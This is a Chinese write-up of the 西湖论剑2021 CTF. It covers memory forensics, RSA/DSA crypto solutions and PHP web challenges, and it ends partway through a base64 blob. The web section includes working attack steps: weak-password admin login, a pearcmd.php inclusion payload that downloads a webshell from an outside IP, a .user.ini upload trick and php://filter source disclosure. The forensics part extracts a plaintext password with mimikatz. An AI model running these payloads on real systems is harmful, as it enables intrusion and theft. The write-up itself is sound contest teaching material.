# 西湖论剑2021 wp

## Misc

### YUSA的小秘密

> 查看`RGB`三通道的时候发现在`RG`两个通道是能够看到部分`Flag`的，在之前`Byte CTF`中的`Hardcore Watermark 01`题目有过类似的考点，图片中每个像素可以通过三个值(通道)来表示，常见的是`R(red)G(green)B(blue)`模式，但是本题用到的通道是`YCrCb`，通过`cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb)`对图片数据进行色彩空间转换，即可得到三个通道的数据

```python
from cv2 import cv2 as cv
img = cv.imread('yusa.png')
imgChange = cv.cvtColor(img, cv.COLOR_BGR2YCrCb)
Y, Cr, Cb = cv.split(imgChange)
cv.imwrite('Y.png', (Y % 2) * 255)
cv.imwrite('Cr.png', (Cr % 2) * 255)
cv.imwrite('Cb.png', (Cb % 2) * 255)
```

> 在`Y`通道拿到含有`Flag`的图片

![](https://p3.ssl.qhimg.com/t019accd2b4977317fd.png)

### 真·签到

> 扫码进入西湖论剑网络安全大赛微信公众号，发送语音说出`西湖论剑2021，我来了`，即可获得本题`Flag`

![](https://p1.ssl.qhimg.com/t01576c69aeb22ef747.png)

### Yusa的秘密

下载附件得到一内存镜像和AES加密的zip文件。zip文件先放着，先对内存镜像作取证工作。

Volatility基本操作，检查内存系统版本，设置profile.

```text
> python2 /home/admin/Downloads/volatility-master/vol.py -f '/home/admin/Downloads/Yusa'\''s secret/Yusa-PC.raw' imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/admin/Downloads/Yusa's secret/Yusa-PC.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800040400a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80004041d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2021-10-29 05:44:03 UTC+0000
     Image local date and time : 2021-10-29 13:44:03 +0800
```

可知是Windows 7 SP1的镜像，现在运行Volatility可以加上`--profile=Win7SP1x64`参数。

Volatility自带很多脚本，可以用`--help`参数查看。

接下来导出一下能扫描出的文件。

```bash
python2 /home/admin/Downloads/volatility-master/vol.py -f '/home/admin/Downloads/Yusa'\''s secret/Yusa-PC.raw' --profile=Win7SP1x64 filescan > files.txt
```

然后就仔细检查所有的输出内容，最终找到这些可疑的文件：

```text
0x000000003e58ada0      1      0 R--r-- \Device\HarddiskVolume2\Program Files\MSBuild\Microsoft\Windows Workflow Foundation\Sakura-didi
0x000000003e748f20      1      0 R--r-d \Device\HarddiskVolume2\Users\Yusa\Contacts\Yusa.contact
0x000000003e78c6a0      1      0 R--r-- \Device\HarddiskVolume2\Users\Yusa\Desktop\Sakura文件\Sakura-公告
0x000000003f2ae290      1      0 R--r-- \Device\HarddiskVolume2\Users\Yusa\Desktop\Sakura文件\Sakura-egg5
0x000000003f3356f0      1      0 R--rw- \Device\HarddiskVolume2\PROGRA~1\MSBuild\MICROS~1\WINDOW~1\key.zip
0x000000003f82fdc0      1      0 R--r-- \Device\HarddiskVolume2\Program Files\Reference Assemblies\Microsoft\Framework\egg2
0x000000003f959980      1      0 R--r-- \Device\HarddiskVolume2\Users\Yusa\Desktop\Sakura文件\Sakura-备忘录
0x000000003fa09070      1      0 R--r-d \Device\HarddiskVolume2\Users\Yusa\Contacts\Mystery Man.contact
0x000000003fabc220      1      0 R--r-- \Device\HarddiskVolume2\Users\Yusa\Desktop\Sakura文件\Sakura-logo
```

用`dumpfiles`导出文件：

```bash
python2 /home/admin/Downloads/volatility-master/vol.py -f '/home/admin/Downloads/Yusa'\''s secret/Yusa-PC.raw' --profile=Win7SP1x64 dumpfiles --dump-dir . -Q [OFFSET]
```

`[OFFSET]`替换为上面列表的第一列内容。`filescan`导出的是物理地址的偏移量，所以需要用`-Q`参数。可以用逗号分隔多个地址以导出多个文件。

导出文件后可对文件重命名以方便识别。其中两个contact文件可以用`Windows 联系人`程序打开。

![](https://p3.ssl.qhimg.com/t01d7b88ab0865e8c82.png)

这里可看到egg3:

![](https://p3.ssl.qhimg.com/t0194cbee7684d38764.png)

![](https://p4.ssl.qhimg.com/t011d5bcf534cc1ca84.png)

这里给出提示让我寻找便笺中的内容。

![](https://p5.ssl.qhimg.com/t01573b92d4d2dc766f.png)

![](https://p3.ssl.qhimg.com/t0141fc03733d82fb16.png)

神秘人联系文件里有base字符串，交给CyberChef一把梭：

![](https://p1.ssl.qhimg.com/t012226b92f1c50d64f.png)

![](https://p5.ssl.qhimg.com/t012c8c796ac43797ef.png)

得到了一个key：`820ac92b9f58142bbbc27ca295f1cf48`。尝试用其解密`Who_am_I.zip`，没有成功。

通过上网查找，得知Windows 便笺的数据存储在`%APPDATA%\Microsoft\Sticky Notes\StickyNotes.snt`，然后再在文件列表内搜索，直接搜索到：

```text
0x000000003fb306e0     16      1 RW-r-- \Device\HarddiskVolume2\Users\Yusa\AppData\Roaming\Microsoft\Sticky Notes\StickyNotes.snt
```

还是跟上面一样的方法提取文件。提取出来后如果直接打开会遇到很多转义字符与编码，不宜查看。所以这里可以采用一个比较直观的方法：直接找一个Windows 7系统，创建一个空便笺，然后把文件替换进去即可。

操作后得到的便笺内容：

![](https://p2.ssl.qhimg.com/t01189809cdae903a31.png)

又得到了一个密码：`世界没了心跳`。但这还是打不开`Who_am_I.zip`。

继续深挖，把当前用户Yusa的用户密码导出：

使用自带的hashdump可从注册表和SAM文件等地方导出NT Hash，但是得到hash后仍需要暴力破解密码。实际上有Mimikatz工具可从`lsass.exe`的进程dump中直接提取出密码。

Mimikatz是Windows平台的工具，但在Linux平台上已经有模仿的工具mimipenguin，可在Kali Linux等系统上使用。

使用Volatility官方社区提供的[插件](https://github.com/volatilityfoundation/community)：

```bash
pip2 install distorm3 Pycrypto yara construct dpapick
```

```bash
git clone https://github.com/volatilityfoundation/community
```

拉取后可以把文件夹放到`volatility/plugins`下，也可用`--plugin`参数指定该文件夹。

```bash
python2 /home/admin/Downloads/volatility-master/vol.py -f '/home/admin/Downloads/Yusa'\''s secret/Yusa-PC.raw' --profile=Win7SP1x64 mimikatz
```

运行结果：

```text
Module   User             Domain           Password                                
-------- ---------------- ---------------- ----------------------------------------
wdigest  Yusa             YUSA-PC          YusaYusa520                             
wdigest  YUSA-PC$         WORKGROUP
```

得到用户账户密码为`YusaYusa520`。用此密码成功解压出`Who_am_I`文件。

上面还得到了一个`key.zip`，也有加密，可以用`世界没了心跳`密码解压得到`exp`文件。

`exp`文件内容：

```python
from PIL import Image
import struct
pic = Image.open('key.bmp')
fp = open('flag', 'rb')
fs = open('Who_am_I', 'wb')

a, b = pic.size
list1 = []
for y in range(b):
    for x in range(a):
        pixel = pic.getpixel((x, y))
        list1.extend([pixel[1], pixel[0], pixel[2], pixel[2], pixel[1], pixel[0]])

data = fp.read()
for i in range(0, len(data)):
    fs.write(struct.pack('B', data[i] ^ list1[i % a*b*6]))
fp.close()
fs.close()
```

可以看出`Who_am_I`正是用此脚本生成的。要解密`flag`文件就需要找到`key.bmp`。

在文件列表里的`Sakura-didi`文件就包含了需要的`key.bmp`。用密码`820ac92b9f58142bbbc27ca295f1cf48`可以成功解压。

得到后根据生成脚本编写解密脚本：

```python
from PIL import Image
import struct
pic = Image.open('key.bmp')
f = open('Who_am_I', 'rb').read()
o = open('flag','wb')

a, b = pic.size
list1 = []
for y in range(b):
    for x in range(a):
        pixel = pic.getpixel((x, y))
        list1.extend([pixel[1], pixel[0], pixel[2], pixel[2], pixel[1], pixel[0]])

for i in range(0, len(f)):
    o.write(struct.pack('B', f[i] ^ list1[i % a*b*6]))
o.close()

```

最后得到的`flag`文件是GIF文件。

用`StegSolve`打开后，经过仔细观察，在第10帧找到了勉强能看清的flag：

![](https://p1.ssl.qhimg.com/t01985d8eddf21e2602.png)

```text
DASCTF{c38376c61-77f1-413e-b2e6-3ccbc96df9f4}
```

附：

* egg1
文件列表内：

```text
0x000000003e20d900      1      0 R--r-- \Device\HarddiskVolume2\Users\Yusa\Desktop\新建文本文档.txt
```

```text
egg1 yusa姐姐很担心比赛时平台卡得崩溃，为此彻夜难眠
```

* egg2
文件列表内：

```text
0x000000003f82fdc0      1      0 R--r-- \Device\HarddiskVolume2\Program Files\Reference Assemblies\Microsoft\Framework\egg2
```

```text
egg2 yusa姐姐是尊贵的SVIP8，不会有人不知道叭
```

* egg3
在Yusa的联系方式里可看到。

```text
egg3 You still have lots more to work on...
```

* egg4
cmd历史记录（consoles）：

```text
egg4 eXVzYeWnkOWnkOacieWlveWkmuWlveWkmueahOWwj+Woh+Wmu++8jOa4o+eUtw==
```

```text
yusa姐姐有好多好多的小娇妻，渣男
```

* egg5
文件列表内：

```text
0x000000003f2ae290      1      0 R--r-- \Device\HarddiskVolume2\Users\Yusa\Desktop\Sakura文件\Sakura-egg5
```

提取出`egg5.zip`需要密码：

```text
0x000000003e5279a0      1      0 R--r-- \Device\HarddiskVolume2\Users\Public\Documents\th1s_1s_3gg5_k3y
```

文件内容也是`th1s_1s_3gg5_k3y`，用密码解压egg5:

```text
yusa姐姐希望西湖论剑的flag格式为yusameinv{.*?}，但我就不^_^
```

## Crypto

### 密码人集合

> 数独游戏，将`1-9`分别对应`我要拿西湖论剑第一`，利用在线网站解密后按照题目答案要求的格式拼接起来提交即可拿到本题的`Flag`

![](https://p4.ssl.qhimg.com/t016db9e2eebfac368e.png)

![](https://p4.ssl.qhimg.com/t01fd4b44b76e48b464.png)

![](https://p0.ssl.qhimg.com/t010a1c44909167dda0.png)

### hardrsa

> `[羊城杯 2020]Power`改编的吧，这里照着这道题的`exp`打就能获取本题的`Flag`
> 先要解决已知明文反求加密指数，采用离散对数来求解，也就是用`sympy`库中的`discrete_log()`来求

```python
import sympy
c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059
y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839
x = sympy.discrete_log(y,c1,2)
print(x)
```

![](https://p4.ssl.qhimg.com/t01e6d3e529d739c84d.png)

> 得到`x`后，利用`sage`解方程就可以得到`p`

```python
y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839
x = 43776275628859890575232443794319298551934804213472744927022818696759188901977390266973172755658396197421139420206549889337117978597883154859965236605452518446448639813055134133587564045471804447818058571586426895800984805588363855865218690877547419152765512143095217413477343835473963637692441032136163289964756172316289469159500312630529091350636808491697553069388388303341623047737553556123142002737059936569931163197364571478509576816349348146215101250803826590694039096063858424405382950769415272111843039715632655831594224288099608827345377164375927559338153505991404973888594356664393487249819589915881178770048740
R.<n> = Zmod(y)[]
f = 2019*n**2 + 2020*n**3 + 2021*n**4 - x
f.roots()
```

![](https://p5.ssl.qhimg.com/t013295e69156eeaed0.png)

> 之后利用参数关系代换就能拿到本题的`Flag`

```python
证明过程：
c = m ** e mod n
dp = d mod (p-1)
c**dp = m**(e*dp) mod n
c**dp mod p = m**(e*dp) mod p
e*dp = e*d mod (p-1) = 1 mod (p-1)
c**dp mod p = m**(1+k*(p-1)) mod p

解题代码：
p = 12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741
c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425
dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473
sage: print(long_to_bytes(pow(c,dp,p)))
    
b'DASCTF{98d923h4344e3bf72f8775xy65tvftv5}'
```

![](https://p3.ssl.qhimg.com/t0161d1b3aa6f5e57a3.png)

### unknown_dsa

> `Pell`方程和`DSA`结合的题目，先求解一下`Pell`方程来获取`ul`和`vl`

```python
def Pell(N, tryNumber = 100):
    m = continued_fraction(sqrt(N))
    for i in range(tryNumber):
        denom = m.denominator(i)
        num = m.numerator(i)
        if num ^ 2 - N * denom ^ 2 == 1:
            return num, denom
    return None, None

Pell(4013184893)
```

> 接着进一步来获取`m1 m2`

```python
import gmpy2
import libnum
import hashlib
from functools import reduce

def CRT(eq):
    return reduce(uni, eq)

def exgcd(a, b):
    if b == 0: return 1, 0
    x, y = exgcd(b, a % b)
    return y, x - a // b * y

def uni(P, Q):
    r1, m1 = P
    r2, m2 = Q
    d = gmpy2.gcd(m1, m2)
    assert (r2 - r1) % d == 0
    l1, l2 = exgcd(m1 // d, m2 // d)
    return (r1 + (r2 - r1) // d * l1 * m1) % gmpy2.lcm(m1, m2), gmpy2.lcm(m1, m2)

if __name__ == "__main__":
    ms1 = [10537190383977432819948602717449313819513015810464463348450662860435011008001132238851729268032889296600248226221086420035262540732157097949791756421026015741477785995033447663038515248071740991264311479066137102975721041822067496462240009190564238288281272874966280, 121723653124334943327337351369224143389428692536182586690052931548156177466437320964701609590004825981378294358781446032392886186351422728173975231719924841105480990927174913175897972732532233, 1440176324831562539183617425199117363244429114385437232965257039323873256269894716229817484088631407074328498896710966713912857642565350306252498754145253802734893404773499918668829576304890397994277568525506501428687843547083479356423917301477033624346211335450]
    
    cs1 =  [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424]
    ms2 = [168450500310972930707208583777353845862723614274337696968629340838437927919365973736431467737825931894403582133125917579196621697175572833671789075169621831768398654909584273636143519940165648838850012943578686057625415421266321405275952938776845012046586285747, 1921455776649552079281304558665818887261070948261008212148121820969448652705855804423423681848341600084863078530401518931263150887409200101780191600802601105030806253998955929263882382004, 25220695816897075916217095856631009012504127590059436393692101250418226097323331193222730091563032067314889286051745468263446649323295355350101318199942950223572194027189199046045156046295274639977052585768365501640340023356756783359924935106074017605019787]
    cs2 = [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842]
    
    m1, mod1 = CRT(zip(cs1,ms1))
    print(m1, mod1)
    print(gmpy2.iroot(m1,7))
    print(libnum.n2s(int(8382905590662478666595114136929713707132131361720892331048437274828529226704174)))
    
    m2, mod2 = CRT(zip(cs2, ms2))
    print(m2, mod2)
    print(gmpy2.iroot(m2, 7))
    print(libnum.n2s(int(10336852405630488944198347577475266693234960398137850045398990629116544863921454)))
```

> 利用`p * q`与`(p - 1) / q`来获取`p、q`
>
> 利用如下公式进行做差求解来获取`k`的值后便可直接求得左半部分和右半部分`Flag`的值
> $$
> \\s1 \equiv (hm1+x1*r1)*k^{-1}(mod \ q)
> \\s2 \equiv (hm2+x1*r1)*k^{-1}(mod \ q)
> $$

```python
import gmpy2
import libnum
q = 895513916279543445314258868563331268261201605181
p = 95139353880772104939870618145448234251031105153406565833029787299040378395002190438381537974853777890692924407167823818980082672873538133127131356810153012924025270883966172420658777903337576027105954119811495411149092960422055445121097259802686960288258399754185484307350305454788837702363971523085335074839
t = 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548
n = p * q
tp = p * q - (p + q)
r1 = 498841194617327650445431051685964174399227739376
r2 = 620827881415493136309071302986914844220776856282
s1 = 376599166921876118994132185660203151983500670896
s2 = 187705159843973102963593151204361139335048329243
s3 = 674735360250004315267988424435741132047607535029
hm1 = 63998600246749767922010292163233985055258508821
hm2 = 1121013631791355094793010532678158450130791457285

differenceOfS = s1 - s2
differenceOfM = hm1 - hm2
k = gmpy2.mul(differenceOfM, gmpy2.invert(differenceOfS, q)) % q
x1 = (s1 * k -hm1) * gmpy2.invert(r1, q) % q
x2 = (s3 * k - hm1) * gmpy2.invert(r2, q) % q
flag = ''
flag = libnum.n2s(int(x1)) + libnum.n2s(int(x2))
print(flag)

DASCTF{f11bad18f529750fe52c56eed85d001b}
```

![](https://p4.ssl.qhimg.com/t011a02a99a7be46fb6.png)

## Web

### OA?RCE?

访问是个信呼OA，直接弱口令跑一波发现后台密码 `admin` `admin123`,登陆后台。

![](https://p3.ssl.qhimg.com/t010e947392ad609167.png)

试了下网上的几个洞发现都打不通，审计源码。

在indexAction.php发现有查看phpinfo函数。

```php
public function phpinfoAction()

  {

    $this->display = false;

    phpinfo();

  }
```

通过`?m=index&a=phpinfo`调用该函数，查看phpinfo。

![](https://p4.ssl.qhimg.com/t019d2af7254b56a855.png)

这里发现`register_argc_argv`开启，想到之前某次比赛打pearcmd下载文件getshell。参考博客[ctfshow 萌新22 （类似级客巅峰web4） - 灰信网（软件开发博客聚合） (freesion.com)](https://www.freesion.com/article/58841365372/)

题目开启了register_argc_argv可以通过+来分隔命令，先进行包含pearcmd.php然后在通过+分隔符来执行download命令。现在还差一个文件包含点来满足博客中`include`。

继续审计代码发现`contain()`可以用来进行包含。

```php
public function getshtmlAction()

  {

   $surl = $this->jm->base64decode($this->get('surl'));

   $num  = $this->get('num');

   $menuname  = $this->jm->base64decode($this->get('menuname'));

   if(isempt($surl))exit('not found');

   $file = ''.P.'/'.$surl.'.php';

   if(!file_exists($file))$file = ''.P.'/'.$surl.'.shtml';

   if(!file_exists($file))exit('404 not found '.$surl.'');

   if(contain($surl,'home/index/rock_index'))$this->showhomeitems();//首页的显示

   $this->displayfile = $file;

   //记录打开菜单日志

   if($num!='home' && getconfig('useropt')=='1')

     m('log')->addlog('打开菜单', '菜单['.$num.'.'.$menuname.']');

  }
```

条件满足，且构造payload文件末尾已附加`php`，且`surl`进行base64编码

写个shell`1.php`在服务器上

```php
<?php system('/readflag');?>
```

发包

```text
?m=index&a=getshtml&surl=Li4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9waHAvcGVhcmNtZA==&+install+-R+/tmp+http://185.194.148.106:8000/1.php
```

成功下载

![](https://p2.ssl.qhimg.com/t019e8249704a608e5d.png)

![](https://p2.ssl.qhimg.com/t016d3ca1aea1a74e38.png)

之后再访问shell的路径

?m=index&a=getshtml&surl=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3RtcC9wZWFyL2Rvd25sb2FkLzE=

getshell

![](https://p0.ssl.qhimg.com/t019cd2bb0cb790618a.png)

### EZupload

访问，注释发现源代码

![](https://p3.ssl.qhimg.com/t0126e6ba3ad18e43e1.png)

得到源码

```php
<?php
error_reporting(0);
require 'vendor/autoload.php';
$latte = new Latte\Engine;
$latte->setTempDirectory('tempdir');
$policy = new Latte\Sandbox\SecurityPolicy;
$policy->allowMacros(['block', 'if', 'else','=']);
$policy->allowFilters($policy::ALL);
$policy->allowFunctions(['trim', 'strlen']);
$latte->setPolicy($policy);
$latte->setSandboxMode();
$latte->setAutoRefresh(false);

if(isset($_FILES['file'])){
  $uploaddir = '/var/www/html/tempdir/';
  $filename = basename($_FILES['file']['name']);
  if(stristr($filename,'p') or stristr($filename,'h') or stristr($filename,'..')){
    die('no');
  }
  $file_conents = file_get_contents($_FILES['file']['tmp_name']);
  if(strlen($file_conents)>28 or stristr($file_conents,'<')){
    die('no');
  }
  $uploadfile = $uploaddir . $filename;
  
  if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
    $message = $filename ." was successfully uploaded.";
  } else {
    $message = "error!";
  }

  $params = [
    'message' => $message,
  ];
  $latte->render('tempdir/index.latte', $params);
}
else if($_GET['source']==1){
  highlight_file(__FILE__);
}
else{
  $latte->render('tempdir/index.latte', ['message'=>'Hellow My Glzjin!']);
}
```

上传对文件名，文件内容有严格过滤，文件名过滤`p`,`h`,还过滤`..`防了文件名php，目录穿越。文件内容直接过滤`<`把标签过滤了。考虑了文件名解析漏洞也无果。开始想利用.htaccess来包含文件，尝试了发现无果，之后尝试.user.ini。

.user.ini内容如下:

```ini
auto_prepend_file = /flag
```

先写个html来上传.user.ini

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
      <title>Title</title>
</head>
<body>
<form action="http://2e878d38-86e3-4b65-9b17-928e7ded6d0a.ezupload-ctf.dasctf.com:2333/" method="post" enctype="multipart/form-data">
  <p><input type="file" name="file"></p>
  <p><input type="submit" value="submit"></p>
</form>
</body>
</html>
```

题目使用latte进行渲染，没有php文件给我们触发`.user.ini`的包含，之后在latte官网[Latte – The Safest & Truly Intuitive Templates for PHP (nette.org)](https://latte.nette.org/)看手册，没有找到可以利用的地方，下载源代码，进行审计。

在这里找到一个带php后缀的生成点，前后都看下，大概意思是模板渲染.latte后还会再生成一个php文件。文件名命名规则是`index.latte--xxxxxxxxxx.php`q其中xxxxxxxxxx跟latte的版本，渲染的文件的名称有关，直接分析算法有些麻烦，尝试本地搭建环境来获取这个文件名。

```php
public function getCacheFile(string $name): string

  {

    $hash = substr($this->getTemplateClass($name), 8);

    $base = preg_match('#([/\\\\][\w@.-]{3,35}){1,3}$#D', $name, $m)

      ? preg_replace('#[^\w@.-]+#', '-', substr($m[0], 1)) . '--'

      : '';

    return "$this->tempDirectory/$base$hash.php";

  }



  public function getTemplateClass(string $name): string

  {

    $key = serialize([$this->getLoader()->getUniqueId($name), self::VERSION, array_keys((array) $this->functions), $this->sandboxed]);

    return 'Template' . substr(md5($key), 0, 10);

  }
```

var_dump下`$key`的值

```text
a:4:{i:0;s:19:"tempdir/index.latte";i:1;s:6:"2.10.4";i:2;a:7:{i:0;s:5:"clamp";i:1;s:11:"divisibleBy";i:2;s:4:"even";i:3;s:5:"first";i:4;s:4:"last";i:5;s:3:"odd";i:6;s:5:"slice";}i:3;b:1;}
```

发现规律：

```text
a:4:{i:0;s:19:"tempdir/index.latte";i:1;s:6:"版本号";i:2;a:7:{i:0;s:5:"clamp";i:1;s:11:"divisibleBy";i:2;s:4:"even";i:3;s:5:"first";i:4;s:4:"last";i:5;s:3:"odd";i:6;s:5:"slice";}i:3;b:1;}
```

[github.com](https://github.com/nette/latte/releases)在github项目查看所有版本

![](https://p2.ssl.qhimg.com/t016494b17362b4913e.png)

![](https://p3.ssl.qhimg.com/t01a9d893e044cccaee.png)

![](https://p3.ssl.qhimg.com/t012dc1237de45ee633.png)

![](https://p5.ssl.qhimg.com/t015b32e96e8f507df4.png)

![](https://p4.ssl.qhimg.com/t01eac1ff425db64001.png)

把每个版本号放入之后md5下，取前10位作为文件命中xxxxxxxxxx的值。

手动拿网站跑一下

![](https://p3.ssl.qhimg.com/t01d7707a34a37063f1.png)

在尝试到2.10.4时成功

之后访问`index.latte--6f26bb0dba.php`得flag

![](https://p4.ssl.qhimg.com/t01bd9c93f6be402ee7.png)

### 灏妹的web

访问啥也没有直接上扫描器，调下速度不能太快

![](https://p4.ssl.qhimg.com/t01fdded5ed67d5a564.png)

这几个有东西的都访问看下，`.idea/dataSources.xml`发现flag

![](https://p1.ssl.qhimg.com/t0159f1743f90852640.png)

### EasyTp

首先看下`public`提示缺少file参数，用php伪协议读出源码

![](https://p4.ssl.qhimg.com/t014b53750a7a16fcc5.png)

?file=php://filter/read=convert.base64-encode/resource=../app/controller/Index.php

```text
PD9waHAKCm5hbWVzcGFjZSBhcHBcY29udHJvbGxlcjsKCnVzZSBhcHBcQmFzZUNvbnRyb2xsZXI7CgpjbGFzcyBJbmRleCBleHRlbmRzIEJhc2VDb250cm9sbGVyCnsKICAgIHB1YmxpYyBmdW5jdGlvbiBpbmRleCgpCiAgICB7CiAgICAgICAgLy9yZXR1cm4gJzxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+KnsgcGFkZGluZzogMDsgbWFyZ2luOiAwOyB9IGRpdnsgcGFkZGluZzogNHB4IDQ4cHg7fSBhe2NvbG9yOiMyRTVDRDU7Y3Vyc29yOiBwb2ludGVyO3RleHQtZGVjb3JhdGlvbjogbm9uZX0gYTpob3Zlcnt0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lOyB9IGJvZHl7IGJhY2tncm91bmQ6ICNmZmY7IGZvbnQtZmFtaWx5OiAiQ2VudHVyeSBHb3RoaWMiLCJNaWNyb3NvZnQgeWFoZWkiOyBjb2xvcjogIzMzMztmb250LXNpemU6MThweDt9IGgxeyBmb250LXNpemU6IDEwMHB4OyBmb250LXdlaWdodDogbm9ybWFsOyBtYXJnaW4tYm90dG9tOiAxMnB4OyB9IHB7IGxpbmUtaGVpZ2h0OiAxLjZlbTsgZm9udC1zaXplOiA0MnB4IH08L3N0eWxlPjxkaXYgc3R5bGU9InBhZGRpbmc6IDI0cHggNDhweDsiPiA8aDE+OikgPC9oMT48cD4gVGhpbmtQSFAgVjY8YnIvPjxzcGFuIHN0eWxlPSJmb250LXNpemU6MzBweCI+MTPovb3liJ3lv4PkuI3mlLkgLSDkvaDlgLzlvpfkv6HotZbnmoRQSFDmoYbmnrY8L3NwYW4+PC9wPjwvZGl2PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vdGFqcy5xcS5jb20vc3RhdHM/c0lkPTY0ODkwMjY4IiBjaGFyc2V0PSJVVEYtOCI+PC9zY3JpcHQ+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9lLnRvcHRoaW5rLmNvbS9QdWJsaWMvc3RhdGljL2NsaWVudC5qcyI+PC9zY3JpcHQ+PHRoaW5rIGlkPSJlYWI0YjlmODQwNzUzZjhlNyI+PC90aGluaz4nOwogICAgICAgIGlmIChpc3NldCgkX0dFVFsnZmlsZSddKSkgewogICAgICAgICAgICAkZmlsZSA9ICRfR0VUWydmaWxlJ107CiAgICAgICAgICAgICRmaWxlID0gdHJpbSgkZmlsZSk7CiAgICAgICAgICAgICRmaWxlID0gcHJlZ19yZXBsYWNlKCcvXHMrLycsJycsJGZpbGUpOwogICAgICAgICAgICBpZihwcmVnX21hdGNoKCIvZmxhZy9pIiwkZmls